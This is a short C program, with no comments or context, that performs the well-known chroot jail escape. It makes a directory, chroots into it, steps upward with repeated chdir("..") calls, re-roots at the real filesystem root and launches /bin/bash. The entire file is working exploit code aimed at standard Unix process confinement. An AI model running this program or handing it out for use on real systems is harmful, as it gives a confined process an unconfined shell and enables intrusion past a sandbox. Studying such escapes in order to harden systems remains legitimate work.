#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
  mkdir("chroot-break", 0755);
  chroot("chroot-break");
  for (int i = 0; i < 10; i++) {
    chdir("..");
  }
  chroot(".");
  system("/bin/bash");
}
